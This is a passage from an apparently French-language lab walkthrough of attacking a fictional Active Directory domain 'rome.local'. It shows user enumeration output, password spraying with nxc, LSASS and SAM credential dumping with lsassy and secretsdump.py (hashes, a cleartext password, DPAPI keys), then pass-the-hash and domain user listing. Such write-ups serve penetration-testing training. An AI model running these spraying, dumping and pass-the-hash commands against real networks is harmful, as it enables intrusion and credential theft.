<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>519: ROME\Enterprise Admins (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>520: ROME\Group Policy Creator Owners (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>521: ROME\Read-only Domain Controllers (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>522: ROME\Cloneable Domain Controllers (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>525: ROME\Protected Users (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>526: ROME\Key Admins (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>527: ROME\Enterprise Key Admins (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>553: ROME\RAS and IAS Servers (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>571: ROME\Allowed RODC Password Replication Group (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>572: ROME\Denied RODC Password Replication Group (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>500: metronum\admin01 (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>501: metronum\Guest (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>503: metronum\DefaultAccount (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>504: metronum\WDAGUtilityAccount (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>513: metronum\None (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1000: ROME\babaorum$ (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1101: ROME\DnsAdmins (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1102: ROME\DnsUpdateProxy (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1103: ROME\brutus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1104: ROME\caius.bonus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1105: ROME\caius.laius (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1106: ROME\caius.pupus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1107: ROME\motus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1108: ROME\couverdepus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1109: ROME\processus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1110: ROME\cartapus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1111: ROME\oursenplus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1112: ROME\detritus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1113: ROME\blocus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1114: ROME\musculus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1115: ROME\radius (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1116: ROME\briseradius (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1117: ROME\plexus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1118: ROME\marcus.sacapus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1119: ROME\yenapus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1120: ROME\chorus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1121: ROME\cleopatre (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1122: ROME\epidemais (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1123: ROME\numerobis (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1124: ROME\amonbofis (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1125: ROME\tournevis (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1126: ROME\tumeheris (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1127: ROME\METRONUM$ (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1128: ROME\lapsus (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>1129: ROME\REFERENDUM$ (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>1003: metronum\localix (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>2101: ROME\MSOL_80541c18ebaa (SidTypeUser)</b></font>
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

On utilise ce résultat pour créer une liste d'utilisateurs `users.rid`.

__`users.rid`:__

```
admin01
amonbofis
babaorum$
blocus
briseradius
brutus
caius.bonus
caius.laius
caius.pupus
cartapus
chorus
cleopatre
couverdepus
DefaultAccount
detritus
epidemais
Guest
jules.cesar
krbtgt
lapsus
localix
marcus.sacapus
METRONUM$
motus
MSOL_80541c18ebaa
musculus
numerobis
oursenplus
plexus
processus
radius
REFERENDUM$
tournevis
tumeheris
WDAGUtilityAccount
yenapus
```

## Password Spraying

On fait notre 1er __password spraying__ avec le mot de passe `wUSYIuhhWy!!12OL` et notre liste d'utilisateurs `users.rid`. Ici on teste une __authentification locale__, d'où le paramètre __`--local-auth`__.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u <u style="text-decoration-style:single">users.rid</u> -p <font color="#F4BF75">&apos;wUSYIuhhWy!!12OL&apos;</font> --local-auth
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:babaorum) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:REFERENDUM) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:village) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:METRONUM) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F92672"><b>[-]</b></font> babaorum\admin01:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F92672"><b>[-]</b></font> babaorum\amonbofis:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F92672"><b>[-]</b></font> babaorum\babaorum$:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F92672"><b>[-]</b></font> babaorum\blocus:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F92672"><b>[-]</b></font> METRONUM\krbtgt:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F92672"><b>[-]</b></font> METRONUM\lapsus:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
[...]
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> METRONUM\localix:wUSYIuhhWy!!12OL <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F92672"><b>[-]</b></font> REFERENDUM\admin01:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F92672"><b>[-]</b></font> REFERENDUM\amonbofis:wUSYIuhhWy!!12OL STATUS_LOGON_FAILURE 
[...]
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

On obtient un compte valide `localix:wUSYIuhhWy!!12OL` sur le serveur `METRONUM`.

## Dumper de LSASS.exe - Metronum

On peut récupérer les hashs de __`lsass.exe`__ avec les modules __`lsassy`__ ou `nanodump`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb metronum -u <font color="#F4BF75">&apos;localix&apos;</font> -p <font color="#F4BF75">&apos;wUSYIuhhWy!!12OL&apos;</font> --local-auth -M lsassy  
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:METRONUM) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> METRONUM\localix:wUSYIuhhWy!!12OL <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#A1EFE4"><b>LSASSY</b></font>      10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>ROME\musculus 0c5a8f7d371f7159fe673933401d0109</b></font>
</code></pre></div>
{{< /rawhtml >}}

Mais j'utilise généralement __`secretsdump.py`__ qui nous permet d'obtenir en clair le __mot de passe__ de l'utilisateur `musculus`. J'utilise ici la commande `tee` pour stocker le résultat.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">secretsdump.py</font> <font color="#F4BF75">&apos;localix&apos;</font>:<font color="#F4BF75">&apos;wUSYIuhhWy!!12OL&apos;</font>@metronum | <font color="#A6E22E">tee</font> metronum.creds
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xdf3d21ca88fdd00ad70548308e9209e1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
admin01:500:aad3b435b51404eeaad3b435b51404ee:e3afa787c8f370de404ee4a44017d419:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cade791b2b8968aac202d66745304824:::
localix:1003:aad3b435b51404eeaad3b435b51404ee:6a876cf1ec742aa43891b97c5acb6a09:::
[*] Dumping cached domain logon information (domain/username:hash)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 14:59:37)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-03 20:37:53)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-04 10:14:06)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-06 23:29:45)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 12:31:30)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 13:04:07)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 14:12:01)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 14:50:46)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 14:54:58)
ROME.LOCAL/musculus:$DCC2$10240#musculus#0fabadcaf35e4477648e96462cb87ce3: (2024-07-02 14:56:56)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ROME\METRONUM$:aes256-cts-hmac-sha1-96:db44fa81c91e42657126c40d56b48e27acf895b2edfd78acbcf9f99e5b78b53a
ROME\METRONUM$:aes128-cts-hmac-sha1-96:6413d058c8dbc25bf175416c14fecb3c
ROME\METRONUM$:des-cbc-md5:0dc26bf7ef46f498
ROME\METRONUM$:plain_password_hex:7700290044005e005e0052006a0031004b006d0032005c007a005e006c004500620054002f005300700054006e0021003b00280062004c00780029004c006b006d003800470066004a00430074004600540031003a00600040006c004100610073004e006b00480056003e003b0047004f00510064002b0078006a004a00420066003b004d0025004c006c00700030005b004d006a006d006b007300440064005100430070006800670028003400580021003c005c005a00750067006300600072005c00340066004200550060006100680027006b004200350040007700700051002400750052004500450023004900
ROME\METRONUM$:aad3b435b51404eeaad3b435b51404ee:0b9c62acf7e9754d98013f89d3ffdf4a:::
[*] DefaultPassword 
rome.local\musculus:wKsz4eq7dEnOC'
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x50384683ad6eb110c4048b143964eeb570a3bdc7
dpapi_userkey:0xeef3ffb09f308eba7ddbc600d421b4e1dac017c1
[*] NL$KM 
 0000   83 1E 11 DA 64 6A 29 90  1B 23 81 DC 73 41 67 71   ....dj)..#..sAgq
 0010   FF C6 DC B9 EE 0A 00 BD  FF E4 3E A7 5D EE 52 DF   ..........&gt;.].R.
 0020   F9 A9 36 1C 6D E3 85 CE  66 11 61 CF CE 0D B3 50   ..6.m...f.a....P
 0030   8B F5 05 6A BF BC A7 61  FD 1F BC 4A 87 2E AF 55   ...j...a...J...U
NL$KM:831e11da646a29901b2381dc73416771ffc6dcb9ee0a00bdffe43ea75dee52dff9a9361c6de385ce661161cfce0db3508bf5056abfbca761fd1fbc4a872eaf55
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
</code></pre></div>
{{< /rawhtml >}}

On obtient les **identifiants** de **musculus**:
    
    rome.local/musculus:wKsz4eq7dEnOC'

ou avec un **hash**

    rome.local\musculus 0c5a8f7d371f7159fe673933401d0109

Ce **musculus** peut se connecter à toutes les machines du domaine `rome.local`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips</u> -u <font color="#F4BF75">&apos;musculus&apos;</font> -H 0c5a8f7d371f7159fe673933401d0109
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\musculus:0c5a8f7d371f7159fe673933401d0109 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

## Énumérer les utilisateurs du domaine

Maintenant que nous avons un compte sur le domaine `rome.local`, on peut lister les utilisateurs.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u musculus -H 0c5a8f7d371f7159fe673933401d0109 --users
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\musculus:0c5a8f7d371f7159fe673933401d0109 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>-Username-                    -Last PW Set-       -BadPW- -Description-  </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>jules.cesar                   2024-07-01 13:25:07 0       Built-in account for administering the computer/domain</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>krbtgt                        2024-07-02 09:35:23 0       Key Distribution Center Service Account</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>-Username-                    -Last PW Set-       -BadPW- -Description-  </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>brutus                        2024-07-02 09:44:14 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>admin01                       2024-07-06 23:59:20 0       Built-in account for administering the computer/domain</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>caius.bonus                   2024-07-02 09:44:15 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>DefaultAccount                &lt;never&gt;             0       A user account managed by the system.</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>caius.laius                   2024-07-02 09:44:15 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>caius.pupus                   2024-07-02 09:44:15 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>localix                       2024-07-02 10:13:33 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>motus                         2024-07-02 09:44:15 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>WDAGUtilityAccount            2024-06-07 11:57:36 0       A user account managed and used by the system for Windows Defender Application Guard scenarios.</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Enumerated 5 local users: metronum
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>couverdepus                   2024-07-02 09:44:15 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>processus                     2024-07-02 09:44:15 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>cartapus                      2024-07-02 09:44:16 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>oursenplus                    2024-07-02 09:44:16 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>detritus                      2024-07-02 09:44:16 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>blocus                        2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>musculus                      2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>radius                        2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>briseradius                   2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>plexus                        2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>marcus.sacapus                2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>yenapus                       2024-07-02 09:44:17 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>chorus                        2024-07-02 09:44:18 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>cleopatre                     2024-07-02 09:44:18 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>epidemais                     2024-07-02 09:44:18 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>numerobis                     2024-07-03 13:23:09 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>amonbofis                     2024-07-02 09:44:18 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>tournevis                     2024-07-02 09:44:18 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>tumeheris                     2024-07-02 09:44:18 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>lapsus                        2024-07-02 10:28:01 0        </b></font>
